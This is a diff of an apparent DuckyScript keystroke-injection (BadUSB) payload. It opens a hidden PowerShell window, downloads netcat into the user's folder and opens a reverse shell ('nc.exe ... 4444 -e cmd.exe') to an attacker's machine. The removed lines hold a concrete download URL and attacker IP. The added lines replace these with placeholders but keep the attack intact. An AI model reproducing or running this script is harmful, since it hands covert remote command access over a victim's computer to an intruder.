@@ -16,7 +16,7 @@ REM Download netcat
 DELAY 1000
 GUI r
 DELAY 800
-STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\nc.exe'; Invoke-WebRequest -Uri 'https://schmitz-server.de/Downloads/nc.exe' -OutFile $thePath}"
+STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\nc.exe'; Invoke-WebRequest -Uri '"address of netcat exe"' -OutFile $thePath}"
 ENTER
 
 REM Connect to attacker
@@ -26,5 +26,5 @@ DELAY 800
 STRING powershell 
 ENTER
 DELAY 1000
-STRING Powershell.exe -windowstyle hidden {.\nc.exe 194.13.81.219 4444 -e cmd.exe}
+STRING Powershell.exe -windowstyle hidden {.\nc.exe "public ip of attacker pc" 4444 -e cmd.exe}
 ENTER
